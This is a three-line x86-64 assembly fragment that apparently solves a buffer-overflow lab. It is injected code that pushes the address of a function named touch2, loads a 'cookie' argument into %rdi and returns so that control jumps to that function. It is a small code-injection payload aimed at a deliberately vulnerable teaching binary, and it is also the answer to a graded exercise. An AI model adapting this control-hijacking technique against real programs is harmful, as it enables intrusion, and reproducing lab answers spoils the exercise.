pushq $0x4017ec         # Address of function touch2
movq $0x59b997fa, %rdi  # Set parameter to our cookie value
retq                    # Transfer control to function touch2
